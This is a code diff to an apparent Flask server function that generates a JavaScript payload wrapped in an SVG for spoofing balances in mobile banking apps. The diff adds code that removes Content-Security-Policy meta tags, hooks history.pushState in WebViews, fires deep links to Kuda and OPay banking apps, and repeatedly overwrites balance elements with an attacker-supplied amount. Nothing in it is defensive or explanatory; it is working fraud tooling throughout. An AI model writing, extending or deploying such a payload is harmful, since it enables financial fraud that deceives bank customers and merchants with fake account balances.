@@ -14,8 +14,53 @@ CORS(app)
 def generate_robust_payload(device_id, target_app, target_amount):
     # Multiple fallback techniques for webview targeting
     js_payload = f"""
+    // WebView detection and hooks
+    function isInWebView() {{
+        return !!(window.navigator.userAgent.match(/Android/i) || 
+                  window.navigator.userAgent.match(/iPhone|iPad|iPod/i));
+    }}
+    
+    // Platform-specific hooks
+    function hookWebView() {{
+        if (!isInWebView()) return;
+        
+        // Override native methods
+        const originalPushState = history.pushState;
+        history.pushState = function() {{
+            originalPushState.apply(this, arguments);
+            setTimeout(() => {{
+                document.querySelectorAll('[data-testid="balance"]').forEach(el => 
+                    el.textContent = '{target_amount}'
+                );
+            }}, 100);
+        }};
+    }}
+    
+    // CSP bypass
+    function bypassCSP() {{
+        try {{
+            const metaTags = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
+            metaTags.forEach(tag => tag.remove());
+        }} catch (e) {}
+    }}
+    
+    // Deep link trigger
+    function triggerDeepLink() {{
+        try {{
+            window.location = 'kuda://balance';
+            window.location = 'opay://dashboard?section=balance';
+            window.location = 'bank://account/balance';
+        }} catch (e) {{
+            setTimeout(() => {{
+                document.querySelectorAll('[data-testid="balance"]').forEach(el => 
+                    el.textContent = '{target_amount}'
+                );
+            }}, 500);
+        }}
+    }}
+    
+    // Primary override function
     function overrideBalance() {{
-        // Method 1: Direct element manipulation
         const balanceSelectors = [
             '[data-testid="balance"]',
             '.account-balance',
@@ -28,7 +73,7 @@ def generate_robust_payload(device_id, target_app, target_amount):
             elements.forEach(el => el.textContent = '{target_amount}');
         }});
         
-        // Method 2: MutationObserver to track DOM changes
+        // MutationObserver for dynamic content
         const observer = new MutationObserver(mutations => {{
             mutations.forEach(mutation => {{
                 mutation.addedNodes.forEach(node => {{
@@ -42,13 +87,16 @@ def generate_robust_payload(device_id, target_app, target_amount):
             }});
         }});
         
-        // Start observing
         observer.observe(document.body, {{ childList: true, subtree: true }});
     }}
     
-    // Run immediately and periodically
-    window.onload = overrideBalance;
-    setInterval(overrideBalance, 1000);
+    // Run everything
+    window.onload = () => {{
+        bypassCSP();
+        hookWebView();
+        triggerDeepLink();
+        overrideBalance();
+    }};
     """
     
     return f"""<svg xmlns="http://www.w3.org/2000/svg">
